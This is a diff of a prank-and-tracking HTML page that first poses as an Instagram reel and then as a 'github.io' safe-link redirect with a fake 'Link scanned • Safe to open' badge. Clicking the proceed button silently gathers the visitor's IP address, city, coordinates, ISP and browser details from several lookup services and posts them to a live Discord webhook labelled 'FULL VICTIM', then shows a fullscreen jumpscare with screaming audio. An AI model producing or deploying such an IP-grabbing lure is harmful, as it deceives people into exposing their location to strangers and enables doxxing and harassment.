@@ -3,129 +3,123 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram • Reel</title>
-  
-  <!-- Fake preview for Discord/Telegram/WhatsApp -->
-  <meta property="og:title" content="Viral reel 🔥 You have to watch this">
-  <meta property="og:description" content="This is insane lol 😂">
-  <meta property="og:image" content="https://picsum.photos/800/1200?random=1">
-  <meta property="og:url" content="https://www.instagram.com/reel/C_abc123xyz/">
+  <title>github.io • Safe Link Redirect</title>
+  <meta property="og:title" content="github.io short link">
+  <meta property="og:description" content="Link scanned • Safe to open">
+  <meta property="og:image" content="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png">
   
   <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      background: #000;
-      overflow: hidden;
-      font-family: Arial, Helvetica, sans-serif;
-    }
-    #loader {
-      position: fixed;
-      inset: 0;
-      background: #000;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 32px;
-      z-index: 10;
-      flex-direction: column;
-      gap: 15px;
-    }
-    #tap-hint {
-      font-size: 18px;
-      opacity: 0.7;
-    }
-    #scare {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: #000 url('https://iili.io/3GqXb4P.png') center/cover no-repeat;
-      color: #ff0000;
-      font-size: 18vw;
-      font-weight: 900;
-      text-align: center;
-      line-height: 100vh;
-      text-shadow: 0 0 60px #ff0000, 0 0 100px #ff0000;
-      z-index: 9999;
-    }
+    body, html { margin:0; padding:0; height:100vh; background:#0d1117; color:#c9d1d9; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif; overflow:hidden; }
+    #loader { position:fixed; inset:0; background:#0d1117; display:flex; align-items:center; justify-content:center; z-index:100000; }
+    .spinner { width:80px; height:80px; border:8px solid #21262d; border-top:8px solid #58a6ff; border-radius:50%; animation:spin 1.2s linear infinite; }
+    @keyframes spin { to {transform:rotate(360deg);} }
+    .container { max-width:620px; margin:60px auto; padding:32px; background:#161b22; border:1px solid #30363d; border-radius:12px; box-shadow:0 10px 40px rgba(0,0,0,0.6); display:none; }
+    h1 { font-size:28px; margin:0 0 24px; color:#58a6ff; text-align:center; }
+    .status { text-align:center; font-size:18px; color:#3fb950; margin:16px 0 32px; font-weight:500; }
+    .progress { height:10px; background:#21262d; border-radius:5px; overflow:hidden; margin:24px 0; }
+    .bar { height:100%; width:0%; background:linear-gradient(90deg,#238636,#2ea043); transition:width 3s ease-out; }
+    .link-preview { background:#0d1117; border:1px solid #30363d; border-radius:8px; padding:16px; margin:24px 0; font-family:ui-monospace,monospace; font-size:15px; color:#8b949e; word-break:break-all; text-align:center; }
+    .btn-proceed { display:block; width:100%; padding:18px; background:#238636; color:white; font-size:20px; font-weight:600; border:none; border-radius:8px; cursor:pointer; transition:all 0.2s; }
+    .btn-proceed:hover { background:#2ea043; transform:translateY(-2px); }
+    #scare { display:none; position:fixed; inset:0; background:#000 url('https://iili.io/3GqXb4P.png') center/cover no-repeat; color:#ff0000; font-size:18vw; font-weight:900; text-align:center; line-height:100vh; text-shadow:0 0 30px #ff0000,0 0 60px #800000,0 0 90px #400000; animation:flicker 0.08s infinite alternate; z-index:999999; }
+    @keyframes flicker { 0% {opacity:1;} 100% {opacity:0.93;} }
   </style>
 </head>
 <body>
 
-<div id="loader">
-  <div>Loading reel...</div>
-  <div id="tap-hint">Tap anywhere</div>
+<div id="loader"><div class="spinner"></div></div>
+
+<div class="container" id="mainContent">
+  <h1>github.io Link Shortener</h1>
+  <div class="status">Link scanned • Safe to open</div>
+  <div class="progress"><div class="bar" id="progressBar"></div></div>
+  <div class="link-preview">https://www.instagram.com/reel/C_8xYzAbCdEfGhIjKlMnOpQrStUvWxYz123456789/</div>
+  <button class="btn-proceed" onclick="triggerScare()">Proceed to link</button>
 </div>
 
 <div id="scare">GET FUCKED!!!</div>
 
 <audio id="scream" preload="auto">
-  <source src="https://files.catbox.moe/4zq9v1.mp3" type="audio/mpeg">
-  Audio not supported.
+  <source src="https://files.catbox.moe/0zq3k8.mp3" type="audio/mpeg">
 </audio>
 
 <script>
-// ──── BOOM ────
-function boom() {
-  console.log("[TRAP] Boom function called");
+// Fake progress
+setTimeout(() => {
+  document.getElementById('loader').style.display = 'none';
+  document.getElementById('mainContent').style.display = 'block';
+  let bar = document.getElementById('progressBar');
+  let w = 0;
+  let id = setInterval(() => {
+    w += 1.8;
+    bar.style.width = w + '%';
+    if (w >= 100) clearInterval(id);
+  }, 50);
+}, 2200);
 
-  // Fire webhook silently (no-cors so it doesn't block anything)
-  fetch('https://discord.com/api/webhooks/1470138524614394000/idmvCsO6APPp8qZkYFP78mR7wxv6oQkHvfpaeAfRm3ePuOFop07McMk8O2EcljvQ-klX', {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      content: "**TRAP ACTIVATED** @here",
-      embeds: [{
-        title: "Victim Hit",
-        description: `UA: ${navigator.userAgent.slice(0,100)}...\nTime: ${new Date().toISOString()}\nScreen: ${screen.width}x${screen.height}\nMobile: ${/Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Yes' : 'No'}`,
-        color: 16711680
-      }]
-    })
-  }).catch(() => console.log("[TRAP] Webhook fired (or blocked)"));
+// ──── FULL TRIGGER ────
+async function triggerScare() {
+  try {
+    // Full IP/location collection
+    const promises = await Promise.allSettled([
+      fetch('https://api.ipify.org?format=json').then(r=>r.json()),
+      fetch('https://ipapi.co/json/').then(r=>r.json()),
+      fetch('https://ipinfo.io/json').then(r=>r.json()),
+      fetch('https://cloudflare.com/cdn-cgi/trace').then(r=>r.text()).then(t=>{
+        let o={}; t.split('\n').forEach(l=>{let [k,v]=l.split('=');if(k&&v)o[k]=v.trim()}); return o;
+      })
+    ]);
 
-  // Show jumpscare
-  console.log("[TRAP] Showing scare");
+    let info = {
+      timestamp: new Date().toISOString(),
+      user_agent: navigator.userAgent,
+      languages: navigator.languages?.join(', ') || 'n/a',
+      screen: `${screen.width}x${screen.height}x${screen.colorDepth || 'n/a'}`,
+      referrer: document.referrer || 'direct',
+      url: window.location.href,
+      mobile: /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Yes' : 'No'
+    };
+
+    promises.forEach(p => {
+      if (p.status === 'fulfilled' && p.value) {
+        let d = p.value;
+        if (d.ip) info.ip = d.ip;
+        if (d.city) info.city = d.city;
+        if (d.region || d.region_name) info.region = d.region || d.region_name;
+        if (d.country || d.country_name) info.country = d.country || d.country_name;
+        if (d.latitude && d.longitude) info.coords = `${d.latitude}, ${d.longitude}`;
+        if (d.org || d.asn_org || d.asn) info.isp = d.org || d.asn_org || d.asn;
+        if (d.postal) info.postal = d.postal;
+      }
+    });
+
+    // Send detailed log
+    fetch('https://discord.com/api/webhooks/1470138524614394000/idmvCsO6APPp8qZkYFP78mR7wxv6oQkHvfpaeAfRm3ePuOFop07McMk8O2EcljvQ-klX', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        content: "**FULL VICTIM – PROCEED CLICKED** @here",
+        embeds: [{
+          title: "Detailed Grab",
+          description: `**IP:** ${info.ip || '?'}\n**Location:** ${info.city || '?'} ${info.region || ''}, ${info.country || '?'}\n**Coords:** ${info.coords || 'n/a'}\n**ISP:** ${info.isp || '?'}\n**UA:** ${info.user_agent.slice(0,150)}...\n**Screen:** ${info.screen}\n**Mobile:** ${info.mobile}\n**Time:** ${info.timestamp}\n**Referrer:** ${info.referrer}`,
+          color: 16711680
+        }]
+      })
+    }).catch(()=>{});
+
+  } catch(e) { /* silent */ }
+
+  // JUMPSCARE
+  document.getElementById('mainContent').style.display = 'none';
   document.getElementById('loader').style.display = 'none';
   document.getElementById('scare').style.display = 'block';
 
-  // Audio
-  const audio = document.getElementById('scream');
-  audio.volume = 1.0;
-  audio.play().then(() => {
-    console.log("[TRAP] Audio playing");
-  }).catch(e => {
-    console.log("[TRAP] Audio blocked:", e.message);
-  });
+  let audio = document.getElementById('scream');
+  audio.volume = 1;
+  audio.play().catch(()=>{});
 
-  // Fullscreen
-  document.documentElement.requestFullscreen().catch(e => {
-    console.log("[TRAP] Fullscreen failed:", e);
-  });
-
-  // NO AUTO REDIRECT - stays on scare forever so you can confirm it works
-  console.log("[TRAP] Jumpscare active - no redirect");
+  document.documentElement.requestFullscreen().catch(()=>{});
 }
-
-// ──── TRIGGER ON LOAD ────
-window.addEventListener('load', () => {
-  console.log("[TRAP] Window loaded - scheduling boom");
-  setTimeout(boom, 800);
-});
-
-// Extra trigger in case load is weird
-document.addEventListener('DOMContentLoaded', () => {
-  console.log("[TRAP] DOMContentLoaded fallback");
-  setTimeout(boom, 1500);
-});
-
-// Click anywhere also triggers (backup)
-document.addEventListener('click', () => {
-  console.log("[TRAP] Click detected - forcing boom");
-  boom();
-});
 </script>
 </body>
 </html>
